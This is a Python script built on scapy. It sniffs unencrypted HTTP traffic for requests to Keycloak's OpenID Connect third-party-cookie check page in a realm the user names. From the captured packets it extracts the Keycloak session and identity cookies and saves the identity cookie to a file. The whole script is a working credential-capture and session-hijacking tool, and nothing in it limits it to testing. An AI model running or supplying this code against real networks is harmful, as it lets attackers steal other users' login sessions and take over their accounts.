from scapy.all import sniff, IP, TCP, Raw
import sys
import subprocess

# Global variable to control sniffing
stop_sniffing = False

def packet_callback(packet, realm_name):
    global stop_sniffing
    if stop_sniffing:
        return

    if packet.haslayer(IP) and packet.haslayer(TCP) and packet.haslayer(Raw):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        payload = packet[Raw].load.decode('utf-8', 'ignore')

        # Check for HTTP traffic with the specified URL
        target_url = f'GET /realms/{realm_name}/protocol/openid-connect/3p-cookies/step1.html'
        if target_url in payload:
            print(f"HTTP packet from {ip_src} to {ip_dst}:\n{payload}\n")

            # Extract cookies from the payload
            auth_session_id_legacy = extract_cookie(payload, 'AUTH_SESSION_ID_LEGACY')
            keycloak_session_legacy = extract_cookie(payload, 'KEYCLOAK_SESSION_LEGACY')
            keycloak_identity_legacy = extract_cookie(payload, 'KEYCLOAK_IDENTITY_LEGACY')

            # Print the keycloak_identity_legacy cookie
            if keycloak_identity_legacy:
                print(f"keycloak_identity_legacy cookie found: {keycloak_identity_legacy}")

                # Store the cookie value in a file
                store_cookie(keycloak_identity_legacy)
                sys.exit(1)

def extract_cookie(payload, cookie_name):
    start_index = payload.find(cookie_name)
    if start_index != -1:
        start_index = payload.find('=', start_index) + 1
        end_index = payload.find(';', start_index)
        cookie_value = payload[start_index:end_index]
        return cookie_value.strip()

    return None

def store_cookie(cookie_value):
    with open('cookie.txt', 'w') as file:
        file.write(cookie_value)

# Replace 'eth0' with the name of your interface
interface = 'eth0'

# Get user input for realm_name
realm_name = input("Enter the realm name: ")
print("Sniffing Login Packets. Stop when keycloak_identity_legacy cookie is found...")

# Start sniffing HTTP traffic with the specific URL filter
sniff(iface=interface, prn=lambda pkt: packet_callback(pkt, realm_name), store=0, filter="tcp port 80 or tcp port 8080")
